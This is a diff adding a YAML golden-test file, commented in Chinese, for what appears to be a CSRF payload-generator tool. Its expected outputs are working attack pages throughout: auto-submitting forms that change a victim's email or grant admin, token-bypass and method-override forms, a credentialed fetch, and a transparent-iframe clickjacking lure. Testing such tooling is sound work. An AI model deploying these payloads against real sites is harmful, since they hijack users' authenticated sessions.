@@ -1,0 +1,297 @@
+# 跨站请求伪造黄金样本。
+#
+# 期望值全部**照着 body 手推**：槽位默认值代入 → 变量替换 → 没有绕过、没有
+# 传输编码，所以 raw 就是代入后的原串。载荷是多行 HTML，所以期望值用块标量
+# `|-` 写（末尾不留换行——body 自己也是 `|-`，多一个换行逐字节比对就会挂）。
+#
+# 三处特意留了样本钉住容易写错的地方：
+#   1. form.payload 不给 nest 时 `<<payload>>` 原样留在载荷里（契约 3），
+#      给了 nest 才在那一步替换掉——顺便证明嵌套确实跑在变量替换之后。
+#   2. form.auto 漏填 target 时保留 `<<target>>` 字面量，没有默认值。
+#   3. json.text_plain 里 `=` 落在最后一个键的值里（这是 enctype=text/plain
+#      的必然副作用），载荷是**页面**而不是请求体，别把两者搞混。
+#
+# content_type 一律 html，运行期没有可靠 parser、会如实返回「未校验」，
+# 所以每条都断言 syntax: unchecked——写 ok 会挂。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= 自动提交表单 =================
+
+  - name: CSRF · 自动提交表单（改邮箱）
+    state:
+      vuln: csrf
+      template: csrf.generic.form.auto
+      vars: {target: "http://a/b", key: email, value: attacker@evil.com}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <form action="http://a/b" method="POST">
+        <input type="hidden" name="email" value="attacker@evil.com">
+        </form>
+        <script>document.forms[0].submit()</script>
+      # 变量都没落在引号字面量内的引号上，不该有提示
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CSRF · 自动提交表单（换一组取值：转账）
+    state:
+      vuln: csrf
+      template: csrf.generic.form.auto
+      vars: {target: "https://bank.example/transfer", key: amount, value: "10000"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <form action="https://bank.example/transfer" method="POST">
+        <input type="hidden" name="amount" value="10000">
+        </form>
+        <script>document.forms[0].submit()</script>
+      syntax: unchecked
+
+  - name: CSRF · 自动提交表单但没填 target（契约 3，不给默认值）
+    state:
+      vuln: csrf
+      template: csrf.generic.form.auto
+      vars: {key: email, value: attacker@evil.com}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <form action="<<target>>" method="POST">
+        <input type="hidden" name="email" value="attacker@evil.com">
+        </form>
+        <script>document.forms[0].submit()</script>
+      syntax: unchecked
+
+  - name: CSRF · 自动提交表单（多字段）
+    state:
+      vuln: csrf
+      template: csrf.generic.form.multi
+      vars:
+        target: "http://a/b"
+        fields: '<input type="hidden" name="new_password" value="P@ssw0rd">'
+      outputs: [raw]
+    expect:
+      payload: |-
+        <form action="http://a/b" method="POST">
+        <input type="hidden" name="new_password" value="P@ssw0rd">
+        </form>
+        <script>document.forms[0].submit()</script>
+      syntax: unchecked
+
+  - name: CSRF · 表单套内层载荷（nest 生效）
+    state:
+      vuln: csrf
+      template: csrf.generic.form.payload
+      vars: {target: "http://a/b", key: comment}
+      nest: "<script>alert(1)</script>"
+      outputs: [raw]
+    expect:
+      # <<payload>> 在内层载荷那一步被换成 nest 的内容，
+      # 位置在 value=" 和 " 之间（引号是 body 里写死的）
+      payload: |-
+        <form action="http://a/b" method="POST">
+        <input type="hidden" name="comment" value="<script>alert(1)</script>">
+        </form>
+        <script>document.forms[0].submit()</script>
+      syntax: unchecked
+
+  - name: CSRF · 表单套内层载荷但没给 nest（占位符原样保留）
+    state:
+      vuln: csrf
+      template: csrf.generic.form.payload
+      vars: {target: "http://a/b", key: comment}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <form action="http://a/b" method="POST">
+        <input type="hidden" name="comment" value="<<payload>>">
+        </form>
+        <script>document.forms[0].submit()</script>
+      syntax: unchecked
+
+  # ================= GET 型 =================
+
+  - name: CSRF · img 型 GET
+    state:
+      vuln: csrf
+      template: csrf.generic.get.img
+      vars: {target: "http://a/b?email=attacker@evil.com"}
+      outputs: [raw]
+    expect:
+      # body 是 <img src="<<target>>">，查询串在 target 里、不在模板里
+      payload: '<img src="http://a/b?email=attacker@evil.com">'
+      checks_count: 0
+      syntax: unchecked
+
+  - name: CSRF · script 型 GET
+    state:
+      vuln: csrf
+      template: csrf.generic.get.script
+      vars: {target: "http://a/b?email=attacker@evil.com"}
+      outputs: [raw]
+    expect:
+      payload: '<script src="http://a/b?email=attacker@evil.com"></script>'
+      syntax: unchecked
+
+  - name: CSRF · 顶层导航 GET（绕 SameSite=Lax）
+    state:
+      vuln: csrf
+      template: csrf.generic.get.navigate
+      vars: {target: "http://a/b?email=attacker@evil.com"}
+      outputs: [raw]
+    expect:
+      payload: "<script>location='http://a/b?email=attacker@evil.com'</script>"
+      checks_count: 0
+      syntax: unchecked
+
+  # ================= JSON 接口 =================
+
+  - name: CSRF · 表单塞 JSON（enctype=text/plain）
+    state:
+      vuln: csrf
+      template: csrf.generic.json.text_plain
+      vars: {target: "http://a/b", key: role, value: admin}
+      outputs: [raw]
+    expect:
+      # 载荷是页面本身。浏览器提交出去的请求体会是
+      # {"role":"admin","z":"="}——名字那半 + 一个等号 + 值那半
+      payload: |-
+        <form action="http://a/b" method="POST" enctype="text/plain">
+        <input name='{"role":"admin","z":"' value='"}'>
+        </form>
+        <script>document.forms[0].submit()</script>
+      syntax: unchecked
+
+  - name: CSRF · 表单塞 JSON（换一组键值）
+    state:
+      vuln: csrf
+      template: csrf.generic.json.text_plain
+      vars: {target: "https://api.example/user", key: is_admin, value: "true"}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <form action="https://api.example/user" method="POST" enctype="text/plain">
+        <input name='{"is_admin":"true","z":"' value='"}'>
+        </form>
+        <script>document.forms[0].submit()</script>
+      syntax: unchecked
+
+  - name: CSRF · fetch 提交 JSON（text/plain 走简单请求）
+    state:
+      vuln: csrf
+      template: csrf.generic.json.fetch
+      vars: {target: "http://a/b", json: '{"role":"admin"}'}
+      outputs: [raw]
+    expect:
+      # 单引号是 body 里写死的 JS 字符串边界，JSON 里的双引号原样落在里面
+      payload: "<script>fetch('http://a/b',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:'{\"role\":\"admin\"}'})</script>"
+      # 手推是 0 条提示：JSON 里的双引号闭合不了外面那对单引号。
+      #
+      # 这条断言曾经写不出来——当时的引擎只要「值里含任意一种引号」就报，
+      # 没比对是哪种引号（单引号串里塞 `"` 是安全的，塞 `'` 才截断）。
+      # 两个独立写模板的人都撞上了这个误报，于是去把引擎改对了，
+      # 这条 checks_count 才有资格加回来。
+      checks_count: 0
+      syntax: unchecked
+
+  # ================= token 绕过 =================
+
+  - name: CSRF · token 未绑定用户（贴自己的 token）
+    state:
+      vuln: csrf
+      template: csrf.generic.token.unbound
+      vars: {target: "http://a/b", key: email, value: attacker@evil.com,
+             tokenname: csrf_token, token: AAA}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <form action="http://a/b" method="POST">
+        <input type="hidden" name="email" value="attacker@evil.com">
+        <input type="hidden" name="csrf_token" value="AAA">
+        </form>
+        <script>document.forms[0].submit()</script>
+      syntax: unchecked
+
+  - name: CSRF · token 只校验存在（值随便填）
+    state:
+      vuln: csrf
+      template: csrf.generic.token.exists_only
+      vars: {target: "http://a/b", key: email, value: attacker@evil.com,
+             tokenname: _token}
+      outputs: [raw]
+    expect:
+      # 值那半是 body 里写死的 x，tokenname 只决定参数名
+      payload: |-
+        <form action="http://a/b" method="POST">
+        <input type="hidden" name="_token" value="x">
+        <input type="hidden" name="email" value="attacker@evil.com">
+        </form>
+        <script>document.forms[0].submit()</script>
+      syntax: unchecked
+
+  - name: CSRF · token 参数留空
+    state:
+      vuln: csrf
+      template: csrf.generic.token.omit
+      vars: {target: "http://a/b", key: email, value: attacker@evil.com,
+             tokenname: authenticity_token}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <form action="http://a/b" method="POST">
+        <input type="hidden" name="email" value="attacker@evil.com">
+        <input type="hidden" name="authenticity_token" value="">
+        </form>
+        <script>document.forms[0].submit()</script>
+      syntax: unchecked
+
+  # ================= 动词伪装与点击劫持 =================
+
+  - name: CSRF · method override（默认 PUT）
+    state:
+      vuln: csrf
+      template: csrf.generic.method.override
+      vars: {target: "http://a/b", key: email, value: attacker@evil.com}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <form action="http://a/b" method="POST">
+        <input type="hidden" name="_method" value="PUT">
+        <input type="hidden" name="email" value="attacker@evil.com">
+        </form>
+        <script>document.forms[0].submit()</script>
+      syntax: unchecked
+
+  - name: CSRF · method override（换成 DELETE）
+    state:
+      vuln: csrf
+      template: csrf.generic.method.override
+      slots: {verb: DELETE}
+      vars: {target: "http://a/b", key: email, value: attacker@evil.com}
+      outputs: [raw]
+    expect:
+      payload: |-
+        <form action="http://a/b" method="POST">
+        <input type="hidden" name="_method" value="DELETE">
+        <input type="hidden" name="email" value="attacker@evil.com">
+        </form>
+        <script>document.forms[0].submit()</script>
+      syntax: unchecked
+
+  - name: CSRF · 点击劫持（透明 iframe）
+    state:
+      vuln: csrf
+      template: csrf.generic.clickjacking.frame
+      vars: {target: "http://a/b"}
+      outputs: [raw]
+    expect:
+      # style 里的花括号、iframe 的属性都是 body 原样，没有槽位也没有别的变量
+      payload: |-
+        <style>
+        iframe{position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.0001;z-index:2}
+        .bait{position:absolute;top:320px;left:40%;z-index:1;font-size:24px}
+        </style>
+        <div class="bait">点这里领奖</div>
+        <iframe src="http://a/b"></iframe>
+      syntax: unchecked
